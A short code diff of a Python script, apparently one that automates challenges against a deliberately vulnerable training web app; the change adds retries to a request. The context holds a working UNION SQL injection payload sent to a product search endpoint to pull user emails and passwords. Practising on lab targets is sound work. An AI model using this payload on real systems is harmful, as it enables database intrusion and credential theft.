@@ -129,7 +129,12 @@ def main():
     print("\n--- Running Task 10: UNION SQL Injection Search ---")
     sqli_query = "qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users/*"
     escaped_query = urllib.parse.quote(sqli_query)
-    status, res = make_request("{}/rest/products/search?q={}".format(base_url, escaped_query), "GET")
+    status, res = 500, None
+    for attempt in range(5):
+        status, res = make_request("{}/rest/products/search?q={}".format(base_url, escaped_query), "GET")
+        if status == 200:
+            break
+        time.sleep(1)
     print("UNION SQLi search status: {}".format(status))
     
     desktop_dir = "/home/ubuntu/Desktop"
